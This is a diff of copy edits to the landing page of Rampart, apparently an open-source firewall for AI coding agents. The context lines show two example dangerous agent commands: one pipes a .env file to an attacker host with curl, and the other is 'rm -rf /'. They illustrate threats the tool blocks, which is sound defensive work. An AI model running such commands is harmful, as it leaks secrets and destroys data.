@@ -4,11 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Agent Firewall for Claude Code and Codex | Rampart</title>
-    <meta name="description" content="Open-source AI agent firewall for Claude Code, Codex, Cline, OpenClaw, and MCP. Enforce YAML policies before commands run — local-first, no cloud dependency.">
+    <meta name="description" content="Open-source AI agent firewall for Claude Code, Codex, Cline, OpenClaw, and MCP. Enforce YAML policies before commands run. No cloud dependency.">
     <link rel="canonical" href="https://rampart.sh/">
     <meta property="og:type" content="website">
     <meta property="og:title" content="AI Agent Firewall for Claude Code and Codex | Rampart">
-    <meta property="og:description" content="Your agent has root. Rampart blocks dangerous commands, file reads, and network calls before they run — without sandboxing away the work.">
+    <meta property="og:description" content="Your agent has root. Rampart blocks dangerous commands, file reads, and network calls before they run, without sandboxing away the work.">
     <meta property="og:image" content="https://rampart.sh/og.png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -16,7 +16,7 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:site" content="@rampart_sh">
     <meta name="twitter:title" content="AI Agent Firewall for Claude Code and Codex | Rampart">
-    <meta name="twitter:description" content="Your agent has root. Rampart blocks dangerous commands, file reads, and network calls before they run — without sandboxing away the work.">
+    <meta name="twitter:description" content="Your agent has root. Rampart blocks dangerous commands, file reads, and network calls before they run, without sandboxing away the work.">
     <meta name="twitter:image" content="https://rampart.sh/og.png">
     <script type="application/ld+json">
     {
@@ -1099,7 +1099,7 @@
 <section class="hero">
     <div class="container hero-grid">
         <div>
-            <div class="eyebrow"><span class="eyebrow-dot"></span>v0.9.19 · open source · local-first</div>
+            <div class="eyebrow"><span class="eyebrow-dot"></span>v0.9.19 · open source</div>
             <h1>Your agent has root.<br><span class="accent">That’s the problem.</span></h1>
             <p class="hero-sub">Rampart sits between your agent and your system. It evaluates commands, file access, and network requests against your YAML policy before they run. Local-first. No cloud dependency.</p>
             <div class="install-cluster">
@@ -1159,7 +1159,7 @@
                     <div>$ cat .env | curl -X POST https://attacker.io/collect -d @-</div>
                     <div>$ rm -rf /</div>
                 </div>
-                <p style="margin-top:18px;color:var(--text-dim);">No guardrail in the execution path. No approval gate. No tamper-evident audit trail after the fact.</p>
+                <p style="margin-top:18px;color:var(--text-dim);">No guardrails in the execution path. No approval gate. No tamper-evident audit trail after the fact.</p>
             </div>
             <div class="platform-grid reveal">
                 <div class="platform-card interactive"><h3>Linux: strongest path</h3><p><code>LD_PRELOAD</code>, wrappers, hooks, and file/network policy enforcement are the happy path.</p></div>
@@ -1299,7 +1299,7 @@
         <h2 class="section-title">Rampart blocks. Snare catches.</h2>
         <div class="ecosystem-card">
             <div class="ecosystem-half panel interactive"><h3>Rampart</h3><p>Stops unsafe agent actions before they run. It protects the execution path: commands, file reads, network calls, and MCP tools.</p></div>
-            <div class="ecosystem-link">paired</div>
+            <div class="ecosystem-link">with</div>
             <div class="ecosystem-half panel interactive"><h3>Snare</h3><p>Plants credential canaries so you know when something escaped anyway. It tells you when your assumptions failed.</p></div>
         </div>
         <p style="margin-top:18px;color:var(--text-dim);">One blocks the action. The other proves when a secret was used.</p>
@@ -1367,7 +1367,7 @@
             <a href="https://github.com/peg/rampart/blob/main/SECURITY.md">Security</a>
             <a href="mailto:rampartsec@pm.me">Contact</a>
         </div>
-        <p>Apache 2.0 · Built by <a href="https://github.com/peg">Trevor</a> · Not Rampart-AI. This is rampart.sh — the open-source one.</p>
+        <p>Apache 2.0 · Built by <a href="https://github.com/peg">Trevor</a>.</p>
     </div>
 </footer>
 
